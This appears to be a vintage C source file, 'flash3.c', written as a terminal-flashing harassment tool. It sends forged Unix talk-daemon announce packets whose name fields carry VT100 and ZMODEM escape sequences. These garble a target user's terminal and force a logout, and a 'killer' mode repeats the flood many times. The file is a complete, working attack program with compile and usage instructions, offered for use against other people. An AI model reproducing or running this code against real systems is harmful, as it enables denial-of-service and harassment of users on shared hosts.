/* flash3.c */

/* 
   Modified from the original by Vassago. Superflash mods unknown.
   Try the PhoEniX FTP Site: wentz21.reslife.okstate.edu in /pub.
*/

/* 
    This little program is intended to quickly mess up a user's
    terminal by issuing a talk request to that person and sending
    vt100 escape characters that force the user to logout or kill
    his/her xterm in order to regain a sane view of the text.
    It the user's message mode is set to off (mesg n) he/she will
    be unharmed. 

    Try compiling with: gcc -o flash flash3.c

    Usage: flash user@host [<level>]
   
    Level is either the number or the word for these:
	  1)  BASIC  - Old flash, no zmodem. 
	  2)  ZMODEM - Old with ZModem.
	  3)  KILLER - 99 ZModem flashes. 
*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>
#include <stdio.h>
#include <strings.h>
#include <string.h>
#include <ctype.h>

#define BASIC  1
#define ZMODEM 2
#define KILLER 3

#define FIRST "\033(0\033#8" 
#define SECOND "\033[1;3r"
#define THIRD  "\033[1;5m\033(0"
#define FOURTH "**\030B00"
#define FIFTH  "\033**EMSI_IRQ8E08"

/* Comment this to remove the debugging message... */
#define INFOMESSAGE

/* this should really be in an include file..  */

#define OLD_NAME_SIZE 9
#define NAME_SIZE    12
#define TTY_SIZE     16 
typedef struct {
	char    type;
	char    l_name[OLD_NAME_SIZE];
	char    r_name[OLD_NAME_SIZE];
	char    filler;
	u_long  id_num;
	u_long  pid;
	char    r_tty[TTY_SIZE];
	struct  sockaddr_in addr;
	struct  sockaddr_in ctl_addr;
} OLD_MSG;

typedef struct {
	u_char  vers;
	char    type;
	u_short filler;
	u_long  id_num;
	struct  sockaddr_in addr;
	struct  sockaddr_in ctl_addr;
	long    pid;
	char    l_name[NAME_SIZE];
	char    r_name[NAME_SIZE];
	char    r_tty[TTY_SIZE];
} CTL_MSG;

int seed = 0x2837;

#define TALK_VERSION    1               /* protocol version */

/* Types */
#define LEAVE_INVITE    0
#define LOOK_UP         1
#define DELETE          2
#define ANNOUNCE        3

int     current = 1;    /* current id..  this to avoid duplications */

struct sockaddr_in *getinaddr(char *hostname, u_short port)
{
static  struct sockaddr    addr;
struct  sockaddr_in *address;
struct  hostent     *host;

address = (struct sockaddr_in *)&addr;
(void) bzero( (char *)address, sizeof(struct sockaddr_in) );
/* fill in the easy fields */
address->sin_family = AF_INET;
address->sin_port = htons(port);
/* first, check if the address is an ip address */
address->sin_addr.s_addr = inet_addr(hostname);
if ( (int)address->sin_addr.s_addr == -1)
	{
	/* it wasn't.. so we try it as a long host name */
	host = gethostbyname(hostname);
	if (host)
		{
		/* wow.  It's a host name.. set the fields */
		/* ?? address->sin_family = host->h_addrtype; */
		bcopy( host->h_addr, (char *)&address->sin_addr,
			host->h_length);
		}
	else
		{
		/* oops.. can't find it.. */
		puts("Flash aborted, could not find address."); 
		exit(-1);
		return (struct sockaddr_in *)0;
		}
	}
/* all done. */
return (struct sockaddr_in *)address;
}

SendTalkPacket(struct sockaddr_in *target, char *p, int psize) 
{
int     s;
struct sockaddr sample; /* not used.. only to get the size */

s = socket(AF_INET, SOCK_DGRAM, 0);
sendto( s, p, psize, 0,(struct sock_addr *)target, sizeof(sample) ); 
} 


new_ANNOUNCE(char *hostname, char *remote, char *local)
{
CTL_MSG  packet; 
struct   sockaddr_in  *address;

/* create a packet */
address = getinaddr(hostname, 666 );  
address->sin_family = htons(AF_INET); 

bzero( (char *)&packet, sizeof(packet) );
packet.vers   = TALK_VERSION; 
packet.type   = ANNOUNCE;   
packet.pid    = getpid();
packet.id_num = current;
bcopy( (char *)address, (char *)&packet.addr, sizeof(packet.addr ) ); 
bcopy( (char *)address, (char *)&packet.ctl_addr, sizeof(packet.ctl_addr));
strncpy( packet.l_name, local, NAME_SIZE); 
strncpy( packet.r_name, remote, NAME_SIZE); 
strncpy( packet.r_tty, "", 1); 

SendTalkPacket( getinaddr(hostname, 518), (char *)&packet, sizeof(packet) ); 
}

old_ANNOUNCE(char *hostname, char *remote, char *local)
{
OLD_MSG  packet;
struct   sockaddr_in  *address;

/* create a packet */
address = getinaddr(hostname, 666 );
address->sin_family = htons(AF_INET);

bzero( (char *)&packet, sizeof(packet) );
packet.type   = ANNOUNCE;
packet.pid    = getpid();
packet.id_num = current;
bcopy( (char *)address, (char *)&packet.addr, sizeof(packet.addr ) );
bcopy( (char *)address, (char *)&packet.ctl_addr, sizeof(packet.ctl_addr));
strncpy( packet.l_name, local, NAME_SIZE);
strncpy( packet.r_name, remote, NAME_SIZE);
strncpy( packet.r_tty, "", 1);

SendTalkPacket( getinaddr(hostname, 517), (char *)&packet, sizeof(packet) );
}

int rnd()
{
  seed *=0x1243;
  seed = seed & 0xFFFF;
  seed +=1;
  while(seed>10000)seed-=10000;
  return(seed);
}


pop(char *hostname, char *username, char *flashstring)
{
  char newflashstr[80];
  int e = rnd();
  sprintf(newflashstr,"%d%s",e,flashstring); 
  new_ANNOUNCE(hostname, username, newflashstr); 
  old_ANNOUNCE(hostname, username, newflashstr);
}    

flash(int type, char *hostname, char *username)
{
	 char firestring[10];
	 int x,y;

	 current=0;
	 if (type == 3) y = 14;
	 else y = 1;

	 for(x=0;x<y;x++)    
	 {
	current++;
	pop(hostname, username, FIRST);
	current++; 
	pop(hostname, username, SECOND);
	current++;
	pop(hostname, username, THIRD); 
	if(type>1)
	{
	  current++;
	  pop(hostname, username, FOURTH); 
	  current++;
	  pop(hostname, username, FIFTH); 
	  current++;
	  pop(hostname, username, FOURTH);
	}
	current++;
	pop(hostname, username, FIRST); 
	 }
    return(current);
}

GetType(char *TypeStr)
{
	if (strcmp(TypeStr,"basic")==0)
		return(1);
	else if (strcmp(TypeStr,"zmodem")==0)
		return(2);
	else if (strcmp(TypeStr,"killer")==0)
		return(3);
	else if (strcmp(TypeStr,"1")==0)
		return(1);
	else if (strcmp(TypeStr,"2")==0)
		return(2);
	else if (strcmp(TypeStr,"3")==0)
		return(3);
}    

main(int argc, char *argv[])
{
	char    *hostname, *username; 
	int     pid,type,name;


	if ( (pid = fork()) == -1)  
		{
		perror("fork()");
		exit(-1);
		}
	if ( !pid )
		{
		exit(0);
		}
	if (argc < 2) { 
		puts("USAGE: flash user@host [<flash type>]");
		puts("Types are: 1) basic, 2) zmodem, 3) killer.");
		puts("Default flash type is zmodem.");
		exit(5);
	}
	if (argc >= 3) {
		type=GetType(argv[argc-1]);
		if(type<1||type>3)type=ZMODEM;
	}
	else type=ZMODEM;   /* default */

	for(name=1; name<argc-1; name++)
	{
	username = argv[name]; 
	if ( (hostname = (char *)strchr(username, '@')) == NULL )       
		{
		puts("Aborted, invalid name.  ");
		exit(-1);
		}
	*hostname = '\0'; 
	hostname++; 

	if (*username == '~') 
		username++; 
#ifdef INFOMESSAGE
			printf("Sending a type #%d flash to %s@%s. (%d messages)\n",
			type,username,hostname,
			flash(type,hostname,username));
#else
	flash(type,hostname,username);
#endif
	sleep(1);
	}
}

